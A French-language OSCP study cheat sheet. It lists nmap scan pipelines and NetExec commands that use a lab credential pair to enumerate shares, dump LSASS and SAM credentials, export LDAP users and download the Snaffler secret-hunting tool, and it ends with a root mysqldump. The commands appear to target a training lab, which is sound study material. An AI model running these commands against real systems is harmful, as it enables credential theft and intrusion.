# OSCP

## Scan de port (TCP)

Si bloqué : scan full `-p-`
```bash
nmap -T4 -Pn --open -oG nmap_full_G.txt -oN nmap_full_N.txt -iL ip.txt

ports=$(grep -oP '\d+/open[^/]*/tcp' nmap_full_G.txt | cut -d'/' -f1 | sort -u | tr '\n' ',' | sed 's/,$//')

nmap -Pn -sC -sV --open -p $ports -oN nmap_full_sCsV.txt -iL ip.txt
```
## Scan de port (UDP)
```bash
nmap -T4 -Pn -sU --open --top-ports=20 -oG nmap_udp_G.txt -oN nmap_udp_N.txt -iL ip.txt

ports=$(grep -oP '\d+/open[^/]*/udp' nmap_udp_G.txt | cut -d'/' -f1 | sort -u | tr '\n' ',' | sed 's/,$//')

nmap -Pn -sC -sV --open -p $ports -oN nmap_udp_sCsV.txt -iL ip.txt
```
## Liste d'adresse IP
```bash
grep open nmap_udp_G.txt | cut -d" " -f2
```

## NetExec
```bash
nxc smb ip.txt -u 'Eric.Wallows' -p 'EricLikesRunning800'
nxc smb ip.txt -u 'Eric.Wallows' -p 'EricLikesRunning800' --shares
nxc smb 192.168.195.95 -u 'Eric.Wallows' -p 'EricLikesRunning800' -M lsassy
nxc smb 192.168.195.95 -u 'Eric.Wallows' -p 'EricLikesRunning800' --sam

nxc ldap 192.168.195.97 -u 'Eric.Wallows' -p 'EricLikesRunning800' --users-export users.txt

nxc smb ip.txt --generate-hosts-file ./hosts
sudo tee -a /etc/hosts < hosts
```

## Snaffler

```bash
wget https://github.com/SnaffCon/Snaffler/releases/download/1.0.244/Snaffler.exe
```

## Exploits 

```bash
sudo apt install default-jdk -y
```

Prendre le temps de bien lire les messages d'erreurs
Bien lire le code en conséquence pour comprendre

## Misc

```powershell
cd C:\xampp\mysql\bin\
.\mysqldump.exe -A -u root > output.txt
```